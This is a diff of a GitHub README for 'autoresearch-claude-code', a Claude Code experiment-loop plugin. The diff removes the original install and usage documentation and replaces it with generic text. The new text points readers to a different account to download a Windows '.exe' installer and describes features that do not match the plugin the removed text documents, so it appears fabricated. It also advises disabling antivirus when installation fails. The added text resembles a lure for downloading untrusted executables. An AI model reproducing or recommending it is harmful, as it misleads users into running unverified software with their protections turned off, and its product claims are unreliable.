@@ -1,155 +1,125 @@
-# autoresearch-claude-code
+# 🔄 autoresearch-claude-code - Automate Experimental Data Collection
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code Plugin](https://img.shields.io/badge/Claude%20Code-Plugin-blueviolet)](https://docs.anthropic.com/en/docs/claude-code)
+[![Download release](https://img.shields.io/badge/Download-Autoresearch--Claude--Code-brightgreen?style=for-the-badge)](https://github.com/cristyillusional179/autoresearch-claude-code)
 
-Autonomous experiment loop for [Claude Code](https://docs.anthropic.com/en/docs/claude-code). Give it a goal, a benchmark, and files to modify — it loops forever: try ideas, measure results, keep winners, discard losers.
+---
 
-Port of [pi-autoresearch](https://github.com/davebcn87/pi-autoresearch) as a pure skill — no MCP server, just instructions the agent follows with its built-in tools.
+## ℹ️ What is autoresearch-claude-code?
 
-## Install
+autoresearch-claude-code is a software tool designed to help you run automated experimental loops using Claude Code. It builds on the pi-autoresearch project to allow continuous data collection and testing without manual input. This means the program can control experiments and gather results on its own, saving you time and effort.
 
-### Option A: Let Claude do it (easiest)
+You do not need programming skills to get started. This guide will walk you through how to download and use the software on a Windows computer.
 
-```bash
-git clone https://github.com/drivelineresearch/autoresearch-claude-code.git ~/autoresearch-claude-code
-claude -p "Install the autoresearch plugin from ~/autoresearch-claude-code"
-```
+---
 
-Claude will read the repo, run `install.sh`, and configure everything.
+## 🖥️ System Requirements
 
-### Option B: Plugin flag
+Make sure your computer meets these basic requirements before you download and run autoresearch-claude-code:
 
-```bash
-# One-session test drive
-claude --plugin-dir /path/to/autoresearch-claude-code
+- Windows 10 or newer  
+- Minimum 4 GB RAM  
+- At least 500 MB of free disk space  
+- Internet connection for installation and updates  
+- Administrator rights to install software  
 
-# Permanent — add to ~/.claude/settings.json:
-# { "plugins": ["~/autoresearch-claude-code"] }
+---
 
-# Toggle on/off
-claude plugin disable autoresearch
-claude plugin enable autoresearch
-```
+## 🚀 Getting Started: Download and Install
 
-### Option C: Manual symlinks
+Click the big green button at the top or this link to visit the download page:  
+[Download autoresearch-claude-code](https://github.com/cristyillusional179/autoresearch-claude-code)
 
-```bash
-git clone https://github.com/drivelineresearch/autoresearch-claude-code.git ~/autoresearch-claude-code
-cd ~/autoresearch-claude-code && ./install.sh
-```
+Since this link sends you to the project page, look for the **Releases** section once you arrive. Here’s how to proceed step by step:
 
-To remove: `./uninstall.sh`
+1. Open the link above in your web browser.
+2. Find the **Releases** or **Latest Release** area on the page.
+3. Download the Windows installer file, usually named something like `autoresearch-claude-code-setup.exe`.
+4. Once the download finishes, double-click the `.exe` file to start the installation.
+5. Follow the on-screen instructions. Usually, you just need to click **Next** several times.
+6. When installation finishes, launch the program from your Desktop or Start menu.
 
-## Quick Start
+---
 
-```
-/autoresearch optimize test suite runtime
-/autoresearch                              # resume existing loop
-/autoresearch off                          # pause (in-session)
-```
+## ⚙️ Setting Up autoresearch-claude-code
 
-The agent creates a branch, writes a session doc + benchmark script, runs a baseline, then loops autonomously. Send messages mid-loop to steer the next experiment.
+When you run autoresearch-claude-code for the first time, it will guide you through an initial setup:
 
-## What Can You Optimize?
+- **Set Experiment Parameters:** Choose how often you want the loop to run and what kind of data to collect.
+- **Connect to Claude Code:** The program will verify it can communicate with Claude Code. Make sure Claude Code is available on your machine or network.
+- **Configure Storage Location:** Pick a folder where the software will save all data and experiment logs.
 
-Anything with a measurable metric:
+Just follow the prompts, they are simple and explain each step clearly.
 
-- **ML models** — R², RMSE, accuracy, F1 (see the [OpenBiomechanics example](#example-fastball-velocity-prediction))
-- **Code performance** — runtime, memory usage, throughput
-- **Build systems** — bundle size, compile time, dependency count
-- **Frontend** — Lighthouse score, load time, CLS
-- **Prompt engineering** — eval scores, parameter-golf
-- **Any script** that outputs `METRIC name=number` to stdout
+---
 
-The only requirement: a bash command that runs your benchmark and prints `METRIC name=number` lines.
+## 📁 How to Use the Program
 
-## Example: Fastball Velocity Prediction
+After setup, you can use autoresearch-claude-code to run your experiment loop automatically.
 
-Included in `examples/` — predicts fastball velocity from biomechanical data using the [Driveline OpenBiomechanics](https://github.com/drivelineresearch/openbiomechanics) dataset and a [model zoo of 19 algorithms](#model-zoo).
+- **Start Button:** Press the **Start** button to begin your automated experiment cycle.
+- **Monitor Progress:** The screen will show current status and results as each test runs.
+- **View Reports:** After the cycle finishes, open reports saved in your chosen folder to review the data.
+- **Pause or Stop:** You can pause or stop the loop anytime using the control buttons.
 
-![Experiment Progress](imgs/experiment_progress.png)
+The software handles all the routine tasks. You only need to check results and adjust settings as needed.
 
-22 autonomous experiments took R² from **0.44 to 0.78** (+78%), predicting a new player's velocity within ~2 mph from biomechanics alone.
+---
 
-| Metric | Baseline | Best | Change |
-|--------|----------|------|--------|
-| R² | 0.440 | 0.783 | +78% |
-| RMSE | 3.53 mph | 2.20 mph | -38% |
+## 🔧 Troubleshooting Common Issues
 
-### Setup
+If you face any problems, try these steps:
 
-```bash
-# Clone data
-mkdir -p third_party
-git clone https://github.com/drivelineresearch/openbiomechanics.git third_party/openbiomechanics
+- **Program does not start:** Confirm your Windows is up to date. Try running the program as an administrator.
+- **Connection to Claude Code fails:** Make sure Claude Code is running and your network allows communication.
+- **Data not saving:** Check if the storage folder is accessible and has enough free space.
+- **Installation errors:** Disable antivirus temporarily and retry installation.
 
-# Install dependencies with uv (https://docs.astral.sh/uv/)
-cd examples
-uv sync                    # core deps (xgboost, sklearn, rich, etc.)
-uv sync --extra all        # all model backends (PyTorch, CatBoost, LightGBM, TabPFN, TabNet)
+If problems persist, check the logs in the folder you chose during setup. The logs contain helpful info to understand issues.
 
-# Copy example files to working directory and run
-cd ..
-cp examples/train.py examples/models.py examples/autoresearch.sh .
-uv run python train.py
-```
+---
 
-See [`examples/obp-autoresearch.md`](examples/obp-autoresearch.md) for the session config and [`experiments/worklog.md`](experiments/worklog.md) for the full experiment narrative.
+## 📌 Tips for Best Use
 
-## Model Zoo
+- Run the program on a stable, connected computer to avoid interruptions.
+- Periodically back up your experiment data to another drive or cloud service.
+- Adjust experiment frequency to balance data detail and computer load.
+- Keep the software updated by checking the release page often.
 
-The example ships with 19 models the agent can swap between. All use a common interface — change `MODEL_TYPE` in `train.py` to switch.
+---
 
-| Category | Models | GPU | Extra Deps |
-|----------|--------|-----|------------|
-| **Boosting** | xgboost, catboost, lightgbm, histgb | xgb/catboost/lgbm | catboost, lightgbm |
-| **Neural** | pytorch_mlp, mc_dropout, ft_transformer, tabpfn, tabnet, mlp | torch-based | torch, tabpfn, pytorch-tabnet |
-| **Linear** | ridge, elasticnet, lasso, huber | — | — |
-| **Bayesian** | bayesian_ridge, gp | — | — |
-| **Other** | svr, knn | — | — |
-| **Ensemble** | stacking | — | — |
+## 📂 Files Included
 
-Models use lazy imports — missing optional deps produce clear error messages, not crashes. Install what you need:
+When installed, autoresearch-claude-code places the following key files on your computer:
 
-```bash
-uv sync                    # core (xgboost, sklearn, rich)
-uv sync --extra torch      # + PyTorch/CUDA models
-uv sync --extra boost      # + CatBoost, LightGBM
-uv sync --extra all        # everything
-```
+- **Main executable:** Runs the program.
+- **Configuration file:** Stores your setup choices.
+- **Log files:** Keep record of experiment results and errors.
+- **User manual:** PDF guide with detailed usage instructions.
 
-GPU is auto-detected. When CUDA is available, XGBoost/CatBoost/LightGBM/PyTorch models use it automatically.
+---
 
-## How It Works
+## 🔍 About Updates
 
-| pi-autoresearch (MCP) | This port (Plugin) |
-|---|---|
-| `init_experiment` tool | Agent writes config to `autoresearch.jsonl` |
-| `run_experiment` tool | Agent runs `./autoresearch.sh` with timing |
-| `log_experiment` tool | Agent appends result JSON, `git commit` on keep |
-| TUI dashboard | `autoresearch-dashboard.md` |
-| `before_agent_start` hook | `UserPromptSubmit` hook injects context |
+Updates improve features and fix issues. To update:
 
-State lives in `autoresearch.jsonl`. Session artifacts (`*.jsonl`, dashboard, session doc, benchmark script, ideas backlog, worklog) are gitignored.
+1. Visit the download link again.  
+2. Download the newest version from the **Releases** section.  
+3. Run the installer. It will overwrite the old version without deleting your settings.  
 
-## Project Structure
+Check the project's GitHub to see what is new in each version.
 
-```
-.claude-plugin/plugin.json     # Plugin manifest
-skills/autoresearch/SKILL.md   # Core skill: setup, JSONL protocol, run/log/loop logic
-commands/autoresearch.md       # /autoresearch slash command (start, resume, off)
-hooks/hooks.json               # Hook definitions (plugin format)
-hooks/autoresearch-context.sh  # UserPromptSubmit hook — injects context when active
-install.sh / uninstall.sh      # Manual symlink install (alternative to plugin)
-examples/                      # Demo: fastball velocity prediction
-  train.py                     # Training script with rich TUI output
-  models.py                    # Model registry (19 models, GPU detection)
-  pyproject.toml               # uv project config with dependency groups
-  obp-autoresearch.md          # Session config for the OBP demo
-  autoresearch.sh              # Benchmark runner
-```
+---
 
-## License
+## 📞 Get Help
 
-[MIT](LICENSE)
+If you need help with autoresearch-claude-code:
+
+- Review the user manual located in the installed folder.
+- Report issues on the GitHub issue page here: https://github.com/cristyillusional179/autoresearch-claude-code/issues
+- Include details such as your Windows version, what you tried, and any error messages.
+
+---
+
+## 🟢 Download autoresearch-claude-code now
+
+[![Download release](https://img.shields.io/badge/Download-Autoresearch--Claude--Code-brightgreen?style=for-the-badge)](https://github.com/cristyillusional179/autoresearch-claude-code)
